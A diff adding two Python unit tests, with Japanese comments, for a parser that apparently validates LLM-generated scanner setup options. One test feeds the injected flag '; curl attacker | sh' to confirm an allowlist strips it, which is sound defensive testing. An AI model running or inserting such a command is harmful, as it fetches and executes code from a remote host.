@@ -45,3 +45,18 @@ def test_empty_and_non_dict_return_none():
 def test_flags_must_be_string_list():
     out = _parse_setup_llm('{"checks": ["os"], "flags": [1, "--x", null]}', KNOWN)
     assert out["flags"] == ["--x"]               # 非文字列を除去
+
+
+def test_bool_depth_rejected():
+    # True は int サブクラスだが depth に採らない（--depth True を防ぐ・#170 P2）
+    out = _parse_setup_llm('{"checks": ["xss"], "depth": true}', KNOWN)
+    assert out["depth"] == 2
+
+
+def test_flags_allowlist_blocks_shell_injection():
+    # コピー可能コマンドへ連結されるため、シェル注入/空白入りオプションを排除（#170 P2）
+    out = _parse_setup_llm(
+        '{"checks": ["os"], "flags": ["; curl attacker | sh", "--dom-xss", "--depth 3", "--llm=claude"]}',
+        KNOWN,
+    )
+    assert out["flags"] == ["--dom-xss", "--llm=claude"]  # 注入と空白入りは落とし、安全形のみ残す
